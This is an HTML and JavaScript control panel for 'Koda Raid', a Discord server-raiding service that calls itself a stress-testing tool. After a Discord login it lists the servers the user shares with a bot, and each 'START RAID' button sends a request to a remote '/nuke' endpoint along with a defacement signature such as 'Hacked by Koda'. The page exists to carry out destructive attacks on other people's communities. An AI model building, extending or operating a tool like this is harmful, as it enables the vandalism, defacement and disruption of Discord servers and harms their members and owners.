<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Koda Raid | Command Center</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #8b5cf6; --bg: #050505; --surface: #101010; --text: #ffffff; --danger: #ef4444; }
        * { box-sizing: border-box; }
        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; margin: 0; padding-top: 80px; min-height: 100vh; }
        
        /* NAVBAR */
        .navbar { position: fixed; top: 0; left: 0; width: 100%; height: 70px; background: rgba(16,16,16,0.9); backdrop-filter: blur(10px); display: flex; align-items: center; justify-content: space-between; padding: 0 5%; z-index: 1000; border-bottom: 1px solid #222; }
        .brand { display: flex; align-items: center; gap: 10px; font-weight: 800; font-size: 1.4rem; color: white; text-decoration: none; }
        .brand img { height: 35px; }
        .brand span em { color: var(--primary); font-style: normal; }
        
        .nav-link { color: #aaa; text-decoration: none; font-weight: 600; cursor: pointer; transition: 0.3s; margin-left: 20px; }
        .nav-link:hover { color: white; }
        .btn-logout { color: var(--danger); border: 1px solid #333; padding: 5px 15px; border-radius: 5px; }

        /* CONTAINER & BANNER */
        .container { max-width: 1000px; margin: 0 auto; padding: 20px; text-align: center; }
        
        /* ESTILO DEL BANNER */
        .banner-img { width: 100%; max-height: 200px; object-fit: cover; border-radius: 12px; margin-bottom: 30px; border: 1px solid #333; box-shadow: 0 0 20px rgba(139, 92, 246, 0.2); }

        .controls { background: var(--surface); padding: 25px; border-radius: 12px; border: 1px solid #222; margin-bottom: 30px; }
        .input-sig { background: #1a1a1a; border: 1px solid #333; color: white; padding: 12px; border-radius: 6px; width: 100%; max-width: 300px; margin-top: 10px; }
        
        /* GRID */
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 20px; }
        .card { background: var(--surface); padding: 20px; border-radius: 12px; border: 1px solid #222; transition: 0.3s; }
        .card:hover { border-color: var(--primary); transform: translateY(-3px); }
        .card img { width: 70px; height: 70px; border-radius: 50%; margin-bottom: 10px; }
        .btn-raid { background: var(--primary); color: white; border: none; padding: 10px; width: 100%; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        
        /* TOAST */
        #toast-container { position: fixed; bottom: 20px; right: 20px; z-index: 9999; }
        .toast { background: #111; border-left: 4px solid var(--primary); padding: 15px; margin-top: 10px; border-radius: 5px; animation: slideIn 0.3s; }
        @keyframes slideIn { from { transform: translateX(100%); } to { transform: translateX(0); } }
    </style>
</head>
<body>

    <nav class="navbar">
        <a href="#" class="brand">
            <img src="logo.png" onerror="this.style.display='none'"> 
            <span>KODA <em>RAID</em></span>
        </a>
        <div id="menu-items">
            </div>
    </nav>

    <div id="toast-container"></div>

    <div class="container" id="main-view">
        <img src="banner.png" class="banner-img" onerror="this.style.display='none'">

        <div class="controls" id="controls-box" style="display:none;">
            <h2 id="txt-panel">Panel de Control</h2>
            <p id="txt-desc" style="color:#888;">Personaliza el ataque antes de iniciar.</p>
            <input type="text" id="sig" class="input-sig" placeholder="Firma / Signature">
        </div>

        <div id="login-msg">
            <h1 style="font-size: 2.5rem;">KODA <span style="color:var(--primary)">RAID</span></h1>
            <p id="txt-welcome">El sistema definitivo para tus servidores.</p>
            <a href="https://koda-raid.onrender.com/login" class="btn-raid" style="width: auto; padding: 15px 30px; display:inline-block; text-decoration:none;" id="btn-login">
                ENTRAR CON DISCORD
            </a>
        </div>

        <div id="server-list" class="grid"></div>
    </div>

    <script>
        // --- 1. DETECCIÃ“N DE IDIOMA ---
        const userLang = navigator.language || navigator.userLanguage;
        const isEsp = userLang.startsWith('es');

        // Diccionario de textos
        const txt = {
            es: {
                panel: "Panel de Control",
                desc: "Personaliza el nombre de los canales.",
                ph: "Firma (Ej: Hacked by Koda)",
                welcome: "El sistema definitivo de gestiÃ³n y pruebas de estrÃ©s.",
                loginBtn: "ENTRAR CON DISCORD",
                invite: "Invitar Bot",
                logout: "Cerrar SesiÃ³n",
                noservers: "No hay servidores mutuos. Â¿Invitaste al bot?",
                raidBtn: "INICIAR RAID",
                toastSent: "ðŸš€ Â¡Ataque enviado!",
                toastErr: "Error de conexiÃ³n."
            },
            en: {
                panel: "Control Panel",
                desc: "Customize channel names before attacking.",
                ph: "Signature (Ex: Hacked by Koda)",
                welcome: "The ultimate system for management and stress testing.",
                loginBtn: "LOGIN WITH DISCORD",
                invite: "Invite Bot",
                logout: "Logout",
                noservers: "No mutual servers found. Did you invite the bot?",
                raidBtn: "START RAID",
                toastSent: "ðŸš€ Attack sent!",
                toastErr: "Connection error."
            }
        };

        const t = isEsp ? txt.es : txt.en;

        // --- 2. APLICAR TEXTOS ---
        document.getElementById('txt-panel').innerText = t.panel;
        document.getElementById('txt-desc').innerText = t.desc;
        document.getElementById('sig').placeholder = t.ph;
        document.getElementById('txt-welcome').innerText = t.welcome;
        document.getElementById('btn-login').innerText = t.loginBtn;

        // --- 3. LÃ“GICA DE SESIÃ“N ---
        const params = new URLSearchParams(window.location.search);
        let token = params.get('token');
        if(token) {
            localStorage.setItem('koda_token', token);
            window.history.replaceState({}, document.title, "/");
        } else {
            token = localStorage.getItem('koda_token');
        }

        const menu = document.getElementById('menu-items');
        const controls = document.getElementById('controls-box');
        const loginMsg = document.getElementById('login-msg');

        if(token) {
            loginMsg.style.display = 'none';
            controls.style.display = 'block';
            
            menu.innerHTML = `
                <a href="https://discord.com/oauth2/authorize?client_id=1469577414022795346" target="_blank" class="nav-link">${t.invite}</a>
                <a onclick="logout()" class="nav-link btn-logout">${t.logout}</a>
            `;
            loadServers();
        } else {
            // Usuario no logueado
        }

        async function loadServers() {
            try {
                const res = await fetch('https://koda-raid.onrender.com/api/servers', {
                    headers: { 'Authorization': `Bearer ${token}` }
                });
                const guilds = await res.json();
                const list = document.getElementById('server-list');
                
                if(guilds.length === 0) {
                    list.innerHTML = `<p>${t.noservers}</p>`;
                    return;
                }

                guilds.forEach(g => {
                    const icon = g.icon ? `https://cdn.discordapp.com/icons/${g.id}/${g.icon}.png` : 'https://i.imgur.com/vHqQWId.png';
                    list.innerHTML += `
                        <div class="card">
                            <img src="${icon}" onerror="this.src='https://i.imgur.com/vHqQWId.png'">
                            <h3>${g.name}</h3>
                            <button class="btn-raid" onclick="raid('${g.id}')">${t.raidBtn}</button>
                        </div>
                    `;
                });
            } catch(e) {
                logout();
            }
        }

        async function raid(id) {
            const sig = document.getElementById('sig').value || 'koda-raid';
            showToast("â³ ...");
            await fetch(`https://koda-raid.onrender.com/nuke?guildId=${id}&name=${encodeURIComponent(sig)}`);
            showToast(t.toastSent);
        }

        function showToast(msg) {
            const c = document.getElementById('toast-container');
            const d = document.createElement('div');
            d.className = 'toast'; d.innerText = msg;
            c.appendChild(d);
            setTimeout(() => d.remove(), 3000);
        }

        function logout() {
            localStorage.removeItem('koda_token');
            window.location.href = '/';
        }
    </script>
</body>
</html>
